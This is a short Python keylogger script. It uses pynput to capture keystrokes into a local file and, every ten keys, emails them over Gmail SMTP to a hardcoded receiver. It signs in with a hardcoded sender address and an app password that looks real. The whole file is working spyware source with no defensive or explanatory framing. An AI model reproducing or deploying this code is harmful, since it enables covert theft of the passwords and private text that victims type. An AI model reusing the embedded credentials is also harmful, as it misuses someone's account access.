from pynput import keyboard
from email.message import EmailMessage
import ssl
import smtplib

emailer = "logger274@gmail.com"
emailerPassword = "aaybvlfbvjdjafsv"
receiver = "ariellewmaltese@gmail.com"

subject = 'Key Logger'
body = " "

def keyPressed(key):
    global body  # Declare 'body' as global

    with open("keyfile.txt", "a") as logKey:
        try:
            keyInput = key.char
            logKey.write(keyInput + "\n")
        except AttributeError:
            print('Error getting char')

    with open("keyfile.txt", "r") as logFile:
        lines = logFile.readlines()

        if len(lines) >= 10:
            for i in range(10):
                body = f"{body} {lines[i].strip()}"  # Corrected line here

            em = EmailMessage()
            em['From'] = emailer
            em['To'] = receiver
            em['Subject'] = subject
            em.set_content(body)

            context = ssl.create_default_context()

            with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
                smtp.login(emailer, emailerPassword)
                smtp.sendmail(emailer, receiver, em.as_string())

            for i in range(10):
                del lines[10 - i - 1]

        with open("keyfile.txt", "w") as logFile:
            logFile.writelines(lines)

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
